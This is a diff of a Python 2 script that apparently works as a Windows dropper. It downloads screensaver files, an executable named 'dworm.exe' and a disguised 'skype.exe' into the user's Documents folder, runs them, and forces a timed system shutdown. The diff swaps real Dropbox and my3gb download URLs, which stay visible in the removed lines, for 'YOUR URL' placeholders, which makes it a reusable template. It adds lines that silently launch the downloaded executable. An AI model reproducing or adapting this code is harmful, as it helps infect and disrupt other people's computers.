@@ -96,6 +96,8 @@ def shut():
             us()
         elif hhz == 60*30:
             os.system("shutdown /s")
+        elif hhz == 60*12:
+            os.system("start C:\Users\%username%\Documents\skype.exe")
         else:
             print "hh"
             time.sleep(1)
@@ -147,17 +149,18 @@ def dn():
 
     global  disf
     disf = "\"C:\Users" + "\\" + quest + "\Documents\""
+    disf2 = "C:\Users" + "\\" + quest + "\Documents\\"
 
-    urllib.urlretrieve("https://www.dropbox.com/s/t4dlg5khvr190m7/bambams.scr?dl=1", "bambams.scr")
-    time.sleep(1)
-    os.system("move bambams.scr " + disf)
-
-    urllib.urlretrieve("https://www.dropbox.com/s/mqqsw2s170t45ho/jajas.scr?dl=1", "jajas.scr")
-    os.system("move jajas.scr " +  disf)
+    urllib.urlretrieve("YOUR URL/bambams.scr?dl=1", disf2 + "bambams.scr")
     time.sleep(1)
 
-    urllib.urlretrieve("https://www.dropbox.com/s/cijstvmp2wf51dc/xavs.scr?dl=1", "xavs.scr")
-    os.system("move xavs.scr " + disf)
+    urllib.urlretrieve("YOUR URL/jajas.scr?dl=1", disf2 + "jajas.scr")
+    time.sleep(1)
+
+    urllib.urlretrieve("YOUR URL/xavs.scr?dl=1", disf2 + "xavs.scr")
+    time.sleep(1)
+
+    urllib.urlretrieve("YOUR URL/skype.exe?dl=1", disf2 + "skype.exe")
     time.sleep(1)
 
     soundbgcode = '''Set Sound = CreateObject("WMPlayer.OCX.7")
@@ -176,16 +179,14 @@ wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
     os.system("move sound.vbs " + disf)
     time.sleep(1)
 
-
-    urllib.urlretrieve("https://www.dropbox.com/s/369sw5dfiimafgq/t.mp3?dl=1", "t.mp3")
-    os.system("move t.mp3 " + disf)
+    urllib.urlretrieve("YOUR URL/t.mp3?dl=1", disf2 + "t.mp3")
     time.sleep(1)
 
-    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
+    wget.download("YOUR URL/dworm.exe")
     os.system("move dworm.exe " + disf)
     time.sleep(1)
 
-    wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
+    wget.download("YOUR URL/fezinho.jpg")
     os.system("move fezinho.jpg " + disf)
 
 
@@ -234,6 +235,7 @@ def checkex():
         print ft
         try:
             wpp()
+            os.system("start C:\Users\%username%\Documents\skype.exe")
         except:
             pass
         while 1 == 1:
